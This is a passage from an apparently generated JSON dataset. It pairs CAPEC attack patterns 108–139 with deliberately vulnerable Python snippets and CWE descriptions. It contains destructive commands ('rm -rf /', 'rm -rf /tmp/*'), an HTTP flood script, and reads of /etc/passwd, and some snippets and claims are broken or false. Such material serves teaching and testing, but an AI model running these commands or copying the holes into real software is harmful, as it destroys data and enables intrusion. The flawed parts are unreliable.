        "description": "This Python code snippet demonstrates a vulnerable web application that is susceptible to Cross-Site Tracing (XST) and other related vulnerabilities. The code uses Flask to create a web application with a single route that accepts both GET and POST requests. When a POST request is received, the application takes user input from the request form and injects it into the HTML response without proper sanitization, making it vulnerable to Cross-Site Scripting (CWE-79). The application also lacks proper verification of user requests, making it vulnerable to Cross-Site Request Forgery (CWE-352). Additionally, the application does not use a protection mechanism to defend against directed attacks, making it vulnerable to Protection Mechanism Failure (CWE-693). The use of privileged APIs without proper verification also makes it vulnerable to Incorrect Use of Privileged APIs (CWE-648). Finally, the application's incomplete denylist-based protection mechanism makes it vulnerable to Incomplete Denylist to Cross-Site Scripting (CWE-692)."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import sqlite3\nimport subprocess\n\ndef inject_sql(db_name, table_name, malicious_input):\n    conn = sqlite3.connect(db_name)\n    cursor = conn.cursor()\n    cursor.execute(f\"INSERT INTO {table_name} (command) VALUES ('{malicious_input}')\")\n    conn.commit()\n    conn.close()\n\n\ndef fetch_and_execute(db_name, table_name):\n    conn = sqlite3.connect(db_name)\n    cursor = conn.cursor()\n    cursor.execute(f\"SELECT command FROM {table_name}\")\n    result = cursor.fetchone()\n    if result:\n        command = result[0]\n        subprocess.call(command, shell=True)\n    conn.close()\n\n# Example usage:\ninject_sql('mydb.db', 'mytable', 'rm -rf /')\nfetch_and_execute('mydb.db', 'mytable')",
        "description": "This Python code snippet demonstrates a vulnerability to SQL injection and OS command injection. The `inject_sql` function inserts malicious input into a SQLite database, and the `fetch_and_execute` function retrieves the injected data and executes it as a shell command using the `subprocess` module. The code does not perform proper input validation or neutralization of special elements, allowing an attacker to inject and execute arbitrary commands."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\n\nengine = create_engine('postgresql://user:password@localhost/dbname')\nSession = sessionmaker(bind=engine)\n\nsession = Session()\n\nusername = request.form['username']\npassword = request.form['password']\n\nquery = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n\nresult = session.execute(query)\n\nif result.rowcount > 0:\n    print(\"Login successful\")\nelse:\n    print(\"Invalid credentials\")",
        "description": "This Python code snippet demonstrates a vulnerable code that is susceptible to SQL injection attack. It uses SQLAlchemy, an Object Relational Mapping (ORM) tool, to interact with a PostgreSQL database. The code constructs a dynamic SQL query using user-controlled input from a web request, which is not properly validated or sanitized. This allows an attacker to inject malicious SQL commands, potentially leading to unauthorized data access or modification."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef get_data(username, password):\n    db = 'mydatabase'\n    user = 'myuser'\n    pwd = 'mypassword'\n    conn = mysql.connector.connect(\n        host='localhost',\n        database=db,\n        user=user,\n        password=pwd\n    )\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE username='\" + username + \"' AND password='\" + password + \"'\"\n    cursor.execute(query)\n    result = cursor.fetchall()\n    return result\n\nsoap_request = ET.parse('soap_request.xml').getroot()\nusername = soap_request.find('.//{http://mynamespace.com}username').text\npassword = soap_request.find('.//{http://mynamespace.com}password').text\nresult = get_data(username, password)\nprint(result)\n",
        "description": "This Python code snippet demonstrates a SQL injection vulnerability through a SOAP request. The get_data function takes a username and password as input and constructs a SQL query using string concatenation. The SOAP request is parsed using ElementTree, and the username and password are extracted from the request. The get_data function is then called with these inputs, allowing an attacker to inject malicious SQL code through the username or password fields."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "import json\n\n# Vulnerable code snippet\n\ndef get_confidential_info():\n    confidential_data = {'username': 'admin', 'password': 'password123'}\n    return json.dumps(confidential_data)\n\n# Server-side code\n\ndef server_response():\n    response = get_confidential_info()\n    return response\n\n# Client-side code (attacker's website)\n\ndef steal_info():\n    script_tag = '<script src=\\",
        "description": "This code snippet demonstrates a vulnerability to JSON Hijacking, which allows an attacker to steal confidential information transmitted from the server to the client inside a JSON object. The server-side code returns a JSON response containing sensitive data, which is then included and executed in the context of the attacker's website, bypassing the Same Origin Policy. The client-side code on the attacker's website includes a script tag that loads the JSON response from the victim's website, allowing the attacker to access the confidential information."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import hashlib\nimport itertools\nimport string\n\n# CWE-330: Insufficiently random password\npassword = 'password123'\n\n# CWE-326: Inadequate encryption strength\nsalt = 'salt'\nhashed_password = hashlib.sha256((password + salt).encode()).hexdigest()\n\n# CWE-521: Weak password requirements\nweak_passwords = ['password123', 'letmein', 'dragonball']\n\n# CWE-307: Improper restriction of excessive authentication attempts\nattempts = 0\nmax_attempts = 1000\n\n# CWE-1390: Weak authentication\nusers = {'user1': hashed_password, 'user2': 'hashed_password2'}\n\n# Brute force attack\nfor user in users:\n    for attempt in itertools.product(string.ascii_letters + string.digits, repeat=8):\n        attempts += 1\n        if attempts > max_attempts:\n            break\n        guess = ''.join(attempt)\n        if guess == password:\n            print(f'Cracked password for user {user}: {guess}')\n            break",
        "description": "A Python code snippet that demonstrates a brute force attack on a weak password system. The system uses insufficiently random passwords, inadequate encryption strength, weak password requirements, and improper restriction of excessive authentication attempts, making it vulnerable to brute force attacks."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import ctypes\n\ndef access_registers():\n    # CWE-1262: Improper Access Control for Register Interface\n    # No access control checks for the registers\n    registers = ctypes.CDLL(None)\n    registers.IOCTL_READ = 0x1234\n    registers.IOCTL_WRITE = 0x5678\n    registers.IOCTL_EXECUTE = 0x9012\n\n    # CWE-782: Exposed IOCTL with Insufficient Access Control\n    # IOCTL functionality should be restricted, but it's not\n    registers.ioctl(registers.IOCTL_EXECUTE, b\"malicious_input\")\n\n    # CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\n    # Unprotected shadow registers allow bypassing access control\n    shadow_registers = ctypes.CDLL(None)\n    shadow_registers.IOCTL_SHADOW = 0x3456\n    shadow_registers.ioctl(shadow_registers.IOCTL_SHADOW, b\"bypass_input\")\n\n    # CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n    # Test or debug logic can be activated at runtime, altering system behavior\n    debug_registers = ctypes.CDLL(None)\n    debug_registers.DEBUG_LOGIC = 0x7890\n    debug_registers.ioctl(debug_registers.DEBUG_LOGIC, b\"activate_debug\")\n\naccess_registers()",
        "description": "This Python code snippet demonstrates the CAPEC of interface manipulation, where an adversary can bypass access control and execute unintended functionality by exploiting vulnerabilities in the interface implementation. The code uses the ctypes library to interact with hardware registers, illustrating CWE-1262, CWE-782, CWE-1299, and CWE-1313. The lack of access control checks, exposed IOCTL functionality, and unprotected shadow registers allow an attacker to manipulate the interface and compromise the system."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-287: Improper Authentication\n    # No password hashing or salting, using plaintext password for comparison\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\n# CWE-1244: Internal Asset Exposed to Unsafe Debug Access Level or State\n# Debug mode is enabled by default, allowing unauthorized access\nDEBUG_MODE = True\n\nif DEBUG_MODE:\n    def debug_authenticate(username, password):\n        # CWE-307: Improper Restriction of Excessive Authentication Attempts\n        # No rate limiting or IP blocking for brute-force attacks\n        for i in range(1000):\n            if authenticate(username, password):\n                return True\n        return False\n\n    # CWE-305: Authentication Bypass by Primary Weakness\n    # Using a weak hashing algorithm (MD5) for password storage\n    hashed_password = hashlib.md5(password.encode()).hexdigest()\n    if hashed_password == '5eb63bbbe01eeed093cb22bb8f5acdc3':\n        return True\n    else:\n        return False\n\n    # CWE-1390: Weak Authentication\n    # Using a weak authentication mechanism (username and password in plain text)\n    if username == 'debug_user' and password == 'debug_password':\n        return True\n    else:\n        return False\n",
        "description": "A Python code snippet demonstrating various authentication weaknesses, including improper authentication, exposed internal assets, lack of rate limiting, authentication bypass, and weak authentication mechanisms."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password123':\n        return True\n    elif username == 'guest' and password == 'guest123':\n        return True\n    else:\n        # CWE-287: Improper Authentication\n        # CWE-302: Authentication Bypass by Assumed-Immutable Data\n        # CWE-1390: Weak Authentication\n        # CWE-288: Authentication Bypass Using an Alternate Path or Channel\n        # CWE-305: Authentication Bypass by Primary Weakness\n        # Assume the username is valid if it contains the substring 'user'\n        if 'user' in username:\n            return True\n    return False\n\n# Example usage:\nusername = 'malicious_user'\npassword = 'invalid_password'\nif authenticate(username, password):\n    print('Authenticated successfully!')\nelse:\n    print('Authentication failed.')",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that can be bypassed by an attacker. The authenticate function checks for specific usernames and passwords, but also has an alternate path that allows any username containing the substring 'user' to be considered valid. This weakness can be exploited by an attacker to gain unauthorized access to the system."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import os\n\ndef search_for_sensitive_info(search_path):\n    for root, dirs, files in os.walk(search_path):\n        for file in files:\n            if file.endswith('.fuse'):\n                with open(os.path.join(root, file), 'r') as f:\n                    print(f.read())\n\n    debug_mode = True\n    if debug_mode:\n        virus_code = 'malicious_code_here'\n        with open('virus.py', 'w') as f:\n            f.write(virus_code)\n        os.system('python virus.py')\n\n    untrusted_search_path = input('Enter a search path: ')\n    search_for_sensitive_info(untrusted_search_path)\n",
        "description": "This Python code snippet demonstrates the CAPEC of actively probing a target to solicit sensitive information. It searches for files with a '.fuse' extension in a user-provided search path, which may contain sensitive information (CWE-200, CWE-1243). The code also writes malicious code to a file and executes it (CWE-509), and uses an untrusted search path that can point to resources not under the product's direct control (CWE-426). The creation of the 'virus.py' file is an example of creating an emergent resource that can be used by attackers (CWE-1229)."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a specific address and port\nserver_socket.bind(('localhost', 12345))\n\n# Listen for incoming connections\nserver_socket.listen(1)\n\nprint('Server started. Listening for incoming connections...')\n\n# Accept an incoming connection\nconnection, address = server_socket.accept()\n\nprint('Connected by', address)\n\n# Receive data from the client\nwhile True:\n    data = connection.recv(1024)\n    if not data:\n        break\n    print('Received data:', data.decode())\n\n    # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n    # CWE-514: Covert Channel\n    # CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n    # An adversary can sniff the network traffic and gather sensitive information\n    # or inject malicious data into the communication channel\n    # The server does not verify the integrity of the received data\n    # and does not control the volume of network traffic\n    print('Sending data back to the client...')\n    connection.sendall(data)\n\n# Close the connection\nconnection.close()\n",
        "description": "This Python code snippet demonstrates a vulnerable server that transmits sensitive information in cleartext and does not ensure the integrity of the received data. An adversary can sniff the network traffic, gather sensitive information, or inject malicious data into the communication channel. The server does not control the volume of network traffic, making it vulnerable to amplification attacks."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import urllib.parse\n\nurl = 'https://example.com/path/../../secret'\nencoded_url = urllib.parse.quote(url, safe=':/')\ndouble_encoded_url = urllib.parse.quote(encoded_url, safe=':/')\nprint(double_encoded_url)\n\n# The output will be: https%3A%2F%2Fexample.com%2Fpath%2F%25%2E%2E%2F%25%2E%2E%2Fsecret\n\n# A vulnerable filter might block the first encoding but allow the double encoding, allowing the payload to reach the target.",
        "description": "This code snippet demonstrates the CAPEC of double encoding to bypass filters. The CWEs related to this CAPEC include CWE-173, CWE-172, CWE-177, CWE-181, CWE-183, CWE-184, CWE-74, CWE-20, CWE-697, and CWE-692. The code takes a URL with a traversal payload, encodes it once, and then encodes the encoded URL again, resulting in a double-encoded URL that might evade filters but still be interpreted correctly by the target."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "import os\n\ndef debug_mode():\n    # CWE-489: Active Debug Code\n    if os.environ.get('DEBUG') == 'True':\n        # CWE-1295: Debug Messages Revealing Unnecessary Information\n        print('Debug mode enabled. Sensitive information: ', os.environ.get('SECRET_KEY'))\n        # CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        os.system('echo 1 > /sys/kernel/debug/debug_logic')\n        # CWE-1209: Failure to Disable Reserved Bits\n        reserved_bits = 0x80000000\n        os.system(f'echo {reserved_bits} > /sys/kernel/debug/reserved_bits')\n        # CWE-1259: Improper Restriction of Security Token Assignment\n        security_token = 'insecure_token'\n        os.system(f'echo {security_token} > /sys/kernel/security_tokens')\n        # CWE-1267: Policy Uses Obsolete Encoding\n        obsolete_encoding = 'base64'\n        os.system(f'echo {obsolete_encoding} > /sys/kernel/encoding')\n        # CWE-1270: Generation of Incorrect Security Tokens\n        incorrect_security_token = 'incorrect_token'\n        os.system(f'echo {incorrect_security_token} > /sys/kernel/security_tokens')\n        # CWE-1294: Insecure Security Identifier Mechanism\n        insecure_security_identifier = 'insecure_identifier'\n        os.system(f'echo {insecure_security_identifier} > /sys/kernel/security_identifiers')\n        # CWE-1302: Missing Source Identifier in Entity Transactions on a System-On-Chip (SOC)\n        os.system('echo > /sys/kernel/transactions')\n        # CWE-1296: Incorrect Chaining or Granularity of Debug Components\n        debug_components = ['component1', 'component2']\n        for component in debug_components:\n            os.system(f'echo {component} > /sys/kernel/debug_components')\n    else:\n        print('Debug mode disabled.')",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting unintentionally enabled debug interfaces on a production system. It includes various CWEs related to active debug code, failure to disable reserved bits, improper restriction of security token assignment, and more. The code enables debug mode, reveals sensitive information, and performs insecure operations, showcasing the potential risks of leaving debug interfaces enabled in production."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class SensitiveResource:\n    def __init__(self):\n        self.data = 'confidential information'\n\n    def access_resource(self, user):\n        # CWE-269: Improper Privilege Management\n        # CWE-284: Improper Access Control\n        if user.username == 'admin':\n            return self.data\n        else:\n            return 'Access denied'\n\n    def modify_resource(self, user, new_data):\n        # CWE-732: Incorrect Permission Assignment for Critical Resource\n        # CWE-1317: Improper Access Control in Fabric Bridge\n        if user.username == 'admin' or user.username == 'moderator':\n            self.data = new_data\n            return 'Resource modified successfully'\n        else:\n            return 'Access denied'\n\n    def compartmentalize_resource(self, user):\n        # CWE-653: Improper Isolation or Compartmentalization\n        if user.username == 'admin':\n            return self.data\n        elif user.username == 'moderator':\n            return 'Partial access granted'\n        else:\n            return 'Access denied'\n\nclass User:\n    def __init__(self, username):\n        self.username = username\n\nresource = SensitiveResource()\nuser1 = User('admin')\nuser2 = User('moderator')\nuser3 = User('user')\n\nprint(resource.access_resource(user1))  # Should print: confidential information\nprint(resource.access_resource(user2))  # Should print: Access denied\nprint(resource.access_resource(user3))  # Should print: Access denied\n\nprint(resource.modify_resource(user1, 'new data'))  # Should print: Resource modified successfully\nprint(resource.modify_resource(user2, 'new data'))  # Should print: Resource modified successfully\nprint(resource.modify_resource(user3, 'new data'))  # Should print: Access denied\n\nprint(resource.compartmentalize_resource(user1))  # Should print: confidential information\nprint(resource.compartmentalize_resource(user2))  # Should print: Partial access granted\nprint(resource.compartmentalize_resource(user3))  # Should print: Access denied",
        "description": "This code snippet demonstrates the CAPEC of exploiting features reserved for privileged users or administrators but exposed to lower or non-privileged accounts. The SensitiveResource class has methods that allow access, modification, and compartmentalization of sensitive data, but the access control checks are incomplete or incorrect, allowing unauthorized users to access or modify the resource."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def vulnerable_function(buffer_size, input_data):\n    buffer = [0] * buffer_size\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]\n    return buffer\n\nbuffer_size = 10\ninput_data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]\nvulnerable_function(buffer_size, input_data)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability. The function `vulnerable_function` allocates a buffer of a fixed size and then copies user-provided input data into the buffer without checking the size of the input data. If the input data is larger than the buffer size, it will overflow the buffer and potentially overwrite adjacent memory locations, leading to unexpected behavior or even code execution."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import threading\n\nclass SharedResource:\n    def __init__(self):\n        self.resource = 0\n        self.lock = threading.Lock()\n\n    def access_resource(self, thread_id):\n        with self.lock:\n            # Simulating some operation on the shared resource\n            self.resource += thread_id\n            print(f'Thread {thread_id} accessed the shared resource: {self.resource}')\n\n    def compromise_resource(self, thread_id):\n        # Simulating an adversary compromising the shared resource\n        with self.lock:\n            self.resource = thread_id * 100\n            print(f'Thread {thread_id} compromised the shared resource: {self.resource}')\n\nshared_resource = SharedResource()\n\nthreads = []\nfor i in range(5):\n    t = threading.Thread(target=shared_resource.access_resource, args=(i,))\n    threads.append(t)\n    t.start()\n\n# Adversary thread compromising the shared resource\nadversary_thread = threading.Thread(target=shared_resource.compromise_resource, args=(10,))\nadversary_thread.start()\n",
        "description": "This code snippet demonstrates the CAPEC of exploiting a shared resource between multiple threads. The `SharedResource` class represents a shared resource that can be accessed by multiple threads. The `access_resource` method simulates a thread accessing the shared resource, while the `compromise_resource` method simulates an adversary compromising the shared resource. The code creates multiple threads that access the shared resource, and an adversary thread that compromises the resource. This demonstrates how an adversary can manipulate a shared resource, affecting the behavior of other threads that trust the validity of the compromised resource."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import socket\nimport threading\nimport time\n\n\ndef flood_target(ip, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip, port))\n    while True:\n        sock.send(b'GET / HTTP/1.1\\r\\nHost: ' + ip.encode() + b'\\r\\n\\r\\n')\n        time.sleep(0.01)\n\n\ndef main():\n    ip = '192.168.1.100'\n    port = 80\n    threads = []\n    for _ in range(1000):\n        t = threading.Thread(target=flood_target, args=(ip, port))\n        t.start()\n        threads.append(t)\n    for t in threads:\n        t.join()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a flooding attack by rapidly sending a large number of HTTP requests to a target IP and port, exhausting its resources and potentially causing it to crash. The code creates 1000 threads, each sending requests at a rate of 100 requests per second, illustrating CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-410 (Insufficient Resource Pool), CWE-400 (Uncontrolled Resource Consumption), and CWE-406 (Insufficient Control of Network Message Volume). The lack of rate limiting and resource control makes the target vulnerable to this type of attack."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import os\n\ndef get_file(file_path):\n    return open(os.path.join('/var/www/html', file_path), 'r').read()\n\nfile_path = '../etc/passwd'\nprint(get_file(file_path))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The get_file function takes a file path as input and returns the contents of the file. The file path is joined with a base directory using os.path.join, but the function does not properly validate the input file path. An attacker can provide a file path with dot-dot-slash characters (../) to traverse out of the intended directory structure and access sensitive files, such as /etc/passwd."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import os\n\n# CWE-424: Improper Protection of Alternate Path\n# CWE-425: Direct Request ('Forced Browsing')\ndef list_directory_contents(path):\n    if os.path.isdir(path):\n        return {'files': os.listdir(path)}\n    else:\n        return {'error': 'Path is not a directory'}\n\n# CWE-288: Authentication Bypass Using an Alternate Path or Channel\n# CWE-285: Improper Authorization\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# CWE-276: Incorrect Default Permissions\n# CWE-693: Protection Mechanism Failure\n\npath = '/var/www/html/'\nprint(list_directory_contents(path))",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a directory listing functionality. It allows an attacker to list the contents of a directory by simply providing the directory path. The code does not perform any authentication or authorization checks, making it vulnerable to forced browsing attacks. Additionally, the code uses default permissions that may allow unauthorized access to sensitive files and directories."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "def process_user_input(user_id):\n    if user_id > 0 and user_id <= 100:\n        return user_id + 1\n    else:\n        return -1\n\n# Example usage:\nuser_id = 2147483647  # Maximum value for a 32-bit signed integer\nresult = process_user_input(user_id)\nprint(result)  # Output: -2147483648, which is a negative number",
        "description": "This code snippet demonstrates the CAPEC of taking advantage of integer variable structure to cause unexpected values. The function process_user_input() checks if the user_id is within a certain range and increments it by 1. However, when the maximum value for a 32-bit signed integer (2147483647) is provided, the increment operation causes an integer overflow, resulting in a negative number (-2147483648). This is an example of CWE-190: Integer Overflow or Wraparound, CWE-682: Incorrect Calculation, CWE-839: Numeric Range Comparison Without Minimum Check, CWE-194: Unexpected Sign Extension, and CWE-192: Integer Coercion Error."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "def vulnerable_function(buffer):\n    pointer = buffer + 10  # CWE-823: Use of Out-of-range Pointer Offset\n    if pointer != 0:  # CWE-476: NULL Pointer Dereference\n        value = buffer[pointer]  # CWE-822: Untrusted Pointer Dereference\n        return value * 2  # CWE-682: Incorrect Calculation\n    else:\n        return 0\n\nbuffer = bytearray(10)  # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\nvulnerable_function(buffer)",
        "description": "This Python code snippet demonstrates a vulnerable function that performs pointer arithmetic on a valid pointer, but uses an offset that can point outside of the intended range of valid memory locations. The function then dereferences the resulting pointer, which can lead to a crash or access to unintended memory locations. The code also includes checks for NULL pointer dereference and performs an incorrect calculation on the retrieved value."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import os\n\ndef allocate_excessive_resources(user_input):\n    # CWE-770: Allocation of Resources Without Limits or Throttling\n    # CWE-1325: Improperly Controlled Sequential Memory Allocation\n    memory_allocation = {}\n    for i in range(int(user_input)):\n        memory_allocation[i] = os.urandom(1024*1024)  # Allocate 1MB of memory\n\n    # CWE-404: Improper Resource Shutdown or Release\n    # CWE-410: Insufficient Resource Pool\n    # CWE-400: Uncontrolled Resource Consumption\n    while True:\n        pass  # Consume CPU cycles indefinitely\n\n# Example usage:\nallocate_excessive_resources('1000000')",
        "description": "This Python code snippet demonstrates the CAPEC of Resource Depletion through Allocation, where an adversary causes the target to allocate excessive resources to servicing the attacker's request. The code allocates a large amount of memory and consumes CPU cycles indefinitely, leading to resource depletion. The CWEs referenced are CWE-770, CWE-1325, CWE-404, CWE-410, and CWE-400."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import socket\n\ndef create_socket():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.bind(('localhost', 8080))\n    s.listen(5)\n    return s\n\ndef handle_request(s):\n    conn, addr = s.accept()\n    print('Connected by', addr)\n    while True:\n        data = conn.recv(1024)\n        if not data:\n            break\n        conn.sendall(data)\n    conn.close()\n\ns = create_socket()\nwhile True:\n    handle_request(s)\n",
        "description": "This code snippet demonstrates a resource leak vulnerability. The create_socket function creates a socket and binds it to a local address. The handle_request function accepts incoming connections and handles requests. However, in the event of an error or exception, the socket is not properly closed or released, leading to a resource leak. This can cause the system to eventually run out of available sockets, making it unavailable for legitimate requests. This code embodies CWE-404, CWE-402, CWE-1229, CWE-826, and CWE-772."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import os\n\n# Vulnerable function that follows symbolic links\n\ndef follow_link(filename):\n    if os.path.isfile(filename):\n        with open(filename, 'r') as f:\n            print(f.read())\n    else:\n        print(\"File not found\")\n\n# Create a symbolic link to a sensitive file\nos.symlink('/etc/passwd', 'link_to_passwd')\n\n# Call the vulnerable function with the symbolic link\nfollow_link('link_to_passwd')",
        "description": "This Python code snippet demonstrates a vulnerability to symbolic link attacks. The 'follow_link' function opens and reads a file specified by the 'filename' parameter. However, it does not properly check if the file is a symbolic link, allowing an attacker to create a link to a sensitive file and trick the function into reading it. In this example, the function is called with a link to the '/etc/passwd' file, which contains sensitive system information."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "import argparse\n\nparser = argparse.ArgumentParser()\nparser.add_argument('--debug', action='store_true', help='Enable debug mode')\nparser.add_argument('--admin', action='store_true', help='Enable admin mode')\nparser.add_argument('--hidden', action='store_true', help='Enable hidden functionality')\n\nargs = parser.parse_args()\n\nif args.debug:\n    print('Debug mode enabled')\n    # Display sensitive processing or configuration information\n    print('Debug information: ', open('/etc/config.txt', 'r').read())\n\nif args.admin:\n    print('Admin mode enabled')\n    # Grant elevated privileges\n    os.setuid(0)\n\nif args.hidden:\n    print('Hidden functionality enabled')\n    # Perform undocumented operation\n    os.system('rm -rf /tmp/*')\n",
        "description": "This Python code snippet demonstrates the CAPEC of attempting to invoke all common switches and options in a target application to discover weaknesses. The code includes several command-line arguments, including --debug, --admin, and --hidden, which can be used to enable different modes or functionalities. The --debug switch displays sensitive processing or configuration information, the --admin switch grants elevated privileges, and the --hidden switch performs an undocumented operation. This code embodies CWE-912 (Hidden Functionality), CWE-184 (Incomplete List of Disallowed Inputs), CWE-391 (Unchecked Error Condition), CWE-1296 (Incorrect Chaining or Granularity of Debug Components), and CWE-1054 (Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer)."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import smtplib\n\n\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\n\n\n\n\n\n\n\n\n\n\n\n\ndef send_email(subject, message, from_addr, to_addr):\n    msg = MIMEMultipart()\n    msg['Subject'] = subject\n    msg['From'] = from_addr\n    msg['To'] = to_addr\n\n    body = MIMEText(message)\n    msg.attach(body)\n\n    server = smtplib.SMTP('smtp.gmail.com', 587)\n    server.starttls()\n    server.login(from_addr, 'password')\n    server.sendmail(from_addr, to_addr, msg.as_string())\n    server.quit()\n\n\nsubject = 'Test Email'\nmessage = 'Hello\\r\\nThis is a test email\\r\\n' + 'Injected Header:Injected Value\\r\\n' + 'Injected Header2:Injected Value2\\r\\n' + '\\r\\n' + 'This is a test email\\r\\n'\nfrom_addr = 'from@example.com'\nto_addr = 'to@example.com'\n\nsend_email(subject, message, from_addr, to_addr)",
        "description": "This Python code snippet demonstrates the CAPEC of email header injection by manipulating the headers and content of an email message using delimiter characters native to the protocol. The code constructs an email message with a malicious payload that injects additional headers, which can lead to security vulnerabilities such as HTTP response splitting, command injection, and improper neutralization of escape, meta, or control sequences."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "user_input = input(\"Enter your name: \")\nprint(\"Hello, %s!\" % user_input)",
        "description": "This Python code snippet is vulnerable to format string injection. The user input is directly used in a format string, allowing an attacker to inject format specifiers such as %s or %n, which can lead to reading or writing to memory locations, or even executing arbitrary code."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import ldap\n\ndef authenticate(username):\n    ldap_filter = \"(uid=\" + username + \")\"\n    try:\n        ldap_connection = ldap.initialize('ldap://localhost:389')\n        result = ldap_connection.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, ldap_filter)\n        if result:\n            return True\n        else:\n            return False\n    except ldap.LDAPError as e:\n        print(e)\n\nusername = input('Enter your username: ')\nif authenticate(username):\n    print('Authentication successful')\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates an LDAP injection vulnerability. The `authenticate` function constructs an LDAP query using user input without proper validation or sanitization, allowing an attacker to inject malicious LDAP commands. For example, an attacker could enter a username like `*`(asterisk) to retrieve information about all users on the system, or `)(uid=*))` to bypass authentication. This code is vulnerable to CWE-77, CWE-90, CWE-20, CWE-89, and CWE-643."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "import requests\n\nurl = 'https://example.com/search'\nuser_input = 'search_term&admin=true'\n\nparams = {'q': user_input}\nresponse = requests.get(url, params=params)\nprint(response.text)",
        "description": "This Python code snippet demonstrates the CAPEC where an adversary manipulates the content of request parameters to undermine the security of the target. The user input is not properly sanitized, allowing an attacker to inject special characters used in the encoding scheme to add or modify parameters. In this example, the user input 'search_term&admin=true' is used to add a new parameter 'admin' with a value of 'true', which can significantly change the meaning of the query processed by the server. This code is vulnerable to CWE-88 (Improper Neutralization of Argument Delimiters in a Command), CWE-116 (Improper Encoding or Escaping of Output), CWE-598 (Use of GET Request Method With Sensitive Query Strings), CWE-838 (Inappropriate Encoding for Output Context), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    module_name = user_input\n    try:\n        module = __import__(module_name)\n        os.system(module.get_function())\n    except AttributeError:\n        print(\"Error: Invalid module or function\")\n\n# Example usage:\nvulnerable_function(\"os\")",
        "description": "This Python code snippet demonstrates the CAPEC of using externally-controlled input to select classes or code ('Unsafe Reflection'). The function 'vulnerable_function' takes user input to select a module, and then uses the 'os' module's 'system' function to execute a command. An attacker can supply a malicious module name to execute arbitrary system commands, leading to command injection (CWE-77) and code injection (CWE-94) vulnerabilities. Additionally, this code is susceptible to reflection attacks (CWE-301) and improper neutralization of special elements used in a command (CWE-77)."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
